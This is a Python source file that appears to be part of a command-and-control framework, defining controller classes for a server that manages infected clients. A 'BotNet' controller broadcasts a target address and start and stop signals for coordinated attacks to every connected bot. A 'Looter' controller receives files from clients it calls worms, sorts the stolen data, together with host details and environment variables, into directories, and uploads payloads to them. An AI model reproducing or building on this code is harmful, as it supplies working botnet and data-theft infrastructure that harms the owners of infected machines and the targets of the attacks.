import os

from multiprocessing import Pipe
from typing import Callable, Union
from time import sleep

from .micro import MicroServer

class BasicControler:
    def __init__(self, pipe : Pipe, server_callback : Callable):
        self.name = "Basic Controler"
        self.pipe = pipe
        self.server = server_callback
        self.headers = self.server.sysHeadears
        self.pauseOverflow = self.server.config["PAUSE_OVERFLOW"]
    
    def check_signal(self) -> Union[list, bool]:
        sleep(self.pauseOverflow)
        check = self.pipe.poll()
        if check:
            recv = self.pipe.recv()
            return recv
        else:
            return None
    
    def sendPipeData(self, data: list):
        try:
            self.pipe.send(data)
        except Exception as e:
            self.server.Msg(f"[!!] ERROR: Try Pipe send data [!!] : {e}")
    
    def sendMsg2Client(self, cliID: str, message: str):
        if cliID.lower() == "all":
            for cli in self.server.Central.clients.values():
                cli.sendMsg(message)
            return
        client = self.server.Central.clients.get(cliID)
        if not client:
            self.server.Msg(f"Client ID:{cliID} is not connected")
            return
        client.sendMsg(message)
    
    def saveCliInfo(self, cliID: str) -> None:
        if cliID.lower() == "all":
            if len(self.server.Central.clients) == 0:
                self.server.Msg("No connected clients")
                return
            response = ""
            for client in self.server.Central.clients.values():
                 response += f"\nClient Info ID={client.ID}\nAddr: {client.Addr}\nName: {client.CliName}\nOs System: {client.Os}\nProcesor: {client.procInfo}\nPlatform: {client.platformInfo}\nNetwork Name: {client.networkName}\nOther Info:\n{client.EnvVar}\n\n\n\n"
            self.server.Msg(response, onlyLog=True)
            return
        client = self.server.Central.clients.get(cliID)
        if not client:
            self.server.Msg(f"[!!] ERROR: Client ID={cliID} does not connected [!!]")
            return
        response = f"\nClient Info ID={client.ID}\nAddr: {client.Addr}\nName: {client.CliName}\nOs System: {client.Os}\nProcesor: {client.procInfo}\nPlatform: {client.platformInfo}\nNetwork Name: {client.networkName}\nOther Info:\n{client.EnvVar}\n\n\n\n"
        self.server.Msg(response, onlyLog=True)
    
    def _servCMD(self, cmd : list) -> None:
        match cmd[1]:
            case "start":
                self.server.listening()
            case "stop":
                self.server.stopListening()
            case "conf":
                self.server.Msg(self.server.config, dictFormat=True, dictName="Server Config")
            case "admin":
                match cmd[2]:
                    case "on":
                        self.server.Http.adminEnable = True
                    case "off":
                        self.server.Http.adminEnable = False
            case "end":
                self.server.turnOFF()
            case _:
                self.servCMD(cmd)

    def servCMD(self, cmd : list) -> None:
        match cmd[1]:
            case _:
                self.server.Msg("Unknown Command")

    def _taskCMD(self, cmd: list) -> None:
        match cmd[1]:
            case "show":
                self.server.Tasker.showTask()
            case _:
                self.taskCMD(cmd)

    def taskCMD(self, cmd: list) -> None:
        match cmd[1]:
            case _:
                self.server.Msg("Unknown Command")
    
    def _cliCMD(self, cmd: list) -> None:
        if not self.server.is_listening:
            self.server.Msg("[!!] Cant not execute command. Server not listening [!!]")
            return
        match cmd[1]:
            case "show":
                self.server.Central.showClient()
            case "send":
                try:
                    self.sendMsg2Client(cmd[2], cmd[3])
                except:
                    pass
            case "save":
                try:
                    self.saveCliInfo(cmd[2])
                except:
                    pass

            case _:
                self.cliCMD(cmd)
    
    def cliCMD(self, cmd: list) -> None:
        match cmd[1]:
            case _:
                self.server.Msg("Unknown Command")
    
    def dracoCMD(self, cmd: list) -> None:
        match cmd[1]:
            case "conf":
                conf = self.server.config
                self.sendPipeData([conf])
            case _:
                self.server.Msg("[!!] Unknown command (server - draconus) [!!]")
    
    def unpackSysMsg(self, msg: str) -> list:
        msg = msg.split(self.headers)
        cmd = []
        for c in msg:
            if c == "" or c == " ":
                continue
            cmd.append(c)
        if len(cmd) == 0:
            return None
        return cmd
  
    def _sysCMD(self, msg: str, handler: object) -> None:
        self.server.Msg(f"SYS MSG:{msg}", sender=handler.ID, dev=True)
        cmd = self.unpackSysMsg(msg)
        if not cmd:
            self.server.Msg(f"[!!] WARNING ! Client id={handler.ID} addr: {handler.Addr} send unknown system message or try spoof you [!!]")
            return
        match cmd[0]:
            case "i":
                handler.updateInfo(cmd[1:])
            case "e":
                self.server.Msg(msg=cmd[1], sender=f"({handler.ID}){handler.Addr}")
                handler.sendMsg(cmd[1])
            case _:
                self.sysCMD(cmd, handler)
    
    def sysCMD(self, cmd: list, handler: object) -> None:
        self.server.Msg(f"[!!] WARNING ! Client id={handler.ID} addr: {handler.Addr} send unknown system message or try spoof you [!!]")

    def _execCMD(self, cmd : list) -> None:
        match cmd[0]:
            case "serv":
                self._servCMD(cmd)
            case "task":
                self._taskCMD(cmd)
            case "cli":
                self._cliCMD(cmd)
            case "help":
                self.server.Msg(self.help())
            case "draco":
                self.dracoCMD(cmd)
            case _:
                self.execCMD(cmd)
    
    def execCMD(self, cmd: list) -> None:
        match cmd[0]:
            case _:
                self.server.Msg("Unknown Command")
    
    def checkCMD(self, cmd: list) -> None:
        if not isinstance(cmd, list):
            self.server.Msg("[!!] WRONG command syntax. Must be a list [!!]")
        else:
            self._execCMD(cmd)
    
    def hilfe(self) -> str:
        hilfe = ""
        hilfe += f"\n***************{self.server.SERV_TYPE} HELP ****************************\n"
        hilfe += "ss serv start        - Start Server Listening\n"
        hilfe += "ss serv stop         - Stop Server Listening\n"
        hilfe += "ss serv conf         - Show Config Server\n"
        hilfe += "ss serv admin on     - Enable Http Admin Function\n"
        hilfe += "ss serv admin off    - Disable Http Admin Function\n"
        hilfe += "ss cli show          - Show All connected clients\n"
        hilfe += "ss cli send <cli_ID> <msg>   - Send message or command to client\n"
        hilfe += "ex: ss cli send 4 Hello      - Send Hello to client no 4\n"
        hilfe += "ex: ss cli send all Hello    - Send Hello to all clients\n"
        return hilfe
    
    def help(self) -> str:
        return self.hilfe()

    
    def START(self) -> None:
        self.server.Msg("Controler Start", dev=True)
        while True:
            cmd = self.check_signal()
            if not cmd:
                continue
            self.server.Msg(f"CMD: {cmd}", dev=True)
            self.checkCMD(cmd)
            
            



class BasicBotControler(BasicControler):
    def __init__(self, pipe : Pipe, server_callback: object):
        super().__init__(pipe, server_callback)
        self.name = "BasicBot Controler"
    
    def setTarget(self, target: str) -> None:
        self.server.targetAttack = target
        self.sendMsg2Client("all", f"tar {target}")
    
    def setAttack(self) -> None:
        self.server.signalAttack = True
        self.sendMsg2Client("all", "ATT")
    
    def stopAttack(self) -> None:
        self.server.signalAttack = False
        self.sendMsg2Client("all", "STP")
    
    def execCMD(self, cmd: list) -> None:
        match cmd[0]:
            case "tar":
                self.setTarget(cmd[1])
            case "att":
                self.setAttack()
            case "stp":
                self.stopAttack()
            case _:
                self.server.Msg("Unknown Command")

    def help(self) -> str:
        hilfe = "\n*************** BOTNET Commands ********************\n"
        hilfe += "-- ss tar <address>          - Set target to all clients\n"
        hilfe += "-- ss att                    - Send signal to start attack\n"
        hilfe += "-- ss stp                    - Send signal to stop attack\n"

        return self.hilfe() + hilfe


class LooterControler(BasicControler):
    def __init__(self, pipe : Pipe, server_callback: object):
        super().__init__(pipe, server_callback)
        self.name = "GypsyKing Controler"

    # def setCoordinates(self, fname: str, flen: str, handler: object, dir_index: str = None) -> None:
    #     if dir_index:
    #         dir_index = self.tagMAP.get(dir_index)
    #         if not dir_index:
    #             return
    #     try:
    #         flen = int(flen)
    #     except (ValueError, TypeError):
    #         self.server.Msg(f"[!!] ERROR: LOOTER recive file_len bad values: {flen} [!!]", dev=True)
    #         return
    #     if dir_index:
    #         xtra = self._xtraServ(self.server, flen, fname, dir_index)
    #     else:
    #         xtra = self._xtraServ(self.server, flen, fname)
    #     self.server.Tasker.addTask(name="Looter Downloader", func_name=xtra.START, info="Download file threading", types="handlers")
    #     handler.sendMsg(f"1 {str(xtra.port)}")

    
    # def prepareWorkplace(self, tag: str, info: str, index_number: str) -> None:
    #     tagDir = os.path.join(self.server._oldConf["OUTPUT_DIR"], self.server.name, tag)
    #     if not os.path.exists(tagDir):
    #         os.mkdir(tagDir)
    #     number = str(len(os.listdir(tagDir)) + 1)
    #     newDir = os.path.join(tagDir, f"{tag}{number}")
    #     try:
    #         os.mkdir(newDir)
    #         with open(os.path.join(newDir, "0000000000000_CLIENT_INFO_0000000000000000.txt"), "w") as f:
    #             f.write(info)
    #     except:
    #         return None
    #     self.tagMAP[index_number] = newDir
    
    # def prepareReadMe(self, tag: str, info: str, handler: object) -> str:
    #     cliInfo = f" ************ {tag} *********\n"
    #     cliInfo += f"--------- {info} -----------\n"
    #     cliInfo += f"Address: {handler.Addr}\n"
    #     cliInfo += f"Worm Name: {handler.CliName}\n"
    #     cliInfo += f"Os System: {handler.Os}\n"
    #     cliInfo += f"Processor: {handler.procInfo}\n"
    #     cliInfo += f"Platform: {handler.platformInfo}\n"
    #     cliInfo += f"Network Name: {handler.networkName}\n"
    #     cliInfo += "\n\n\n"
    #     cliInfo += handler.EnvVar
    #     return cliInfo
    
    # def uploadFile(self, cliID: str, file_name: str) -> None:
    #     if not self.server.is_listening:
    #         self.server.Msg("[!!] ERROR: Server not listening [!!]")
    #         return
    #     fpath = os.path.join(self.server.config["PAYLOAD_DIR"], file_name)
    #     if not os.path.exists(fpath):
    #         self.server.Msg(f"[!!] ERROR: file name: {file_name} does not exists in PAYLOAD dir [!!]")
    #         return
    #     file_len = os.stat(fpath).st_size
    #     xtra = self._xtraServ(server_callback=self.server, file_name=file_name, work="upload")
    #     self.server.Tasker.addTask(name="Looter Uploader", func_name=xtra.START, info="Upload file threading", types="handlers")
    #     self.sendMsg2Client(cliID, f"$$UPL$${str(xtra.port)}$${file_name}$${str(file_len)}")
        
        

    
    def sysCMD(self, cmd: list, handler: object) -> None:
        match cmd[0]:
            case "d":
                if len(cmd) == 3:
                    self.server.setCoordinates(cmd[1], cmd[2], handler)
                elif len(cmd) == 4:
                    self.server.setCoordinates(cmd[1], cmd[2], handler, cmd[3])
                else:
                    self.server.Msg(f"[!!] ERROR: incomplete sys msg [!!]")

            case "w":
                if len(cmd) < 4:
                    self.server.Msg(f"[!!] ERROR: incomplete sys msg [!!]")
                    return
                clinfo = self.server.prepareReadMe(cmd[1], cmd[2], handler)
                self.server.prepareWorkplace(cmd[1], clinfo, cmd[3])
            case _:
                self.server.Msg(f"[!!] WARNING ! Client id={handler.ID} addr: {handler.Addr} send unknown system message or try spoof you [!!]")
    
    def execCMD(self, cmd: list) -> None:
        match cmd[0]:
            case "up":
                self.server.uploadFile(cmd[1], cmd[2])
            case _:
                self.server.Msg("Unknown Command")
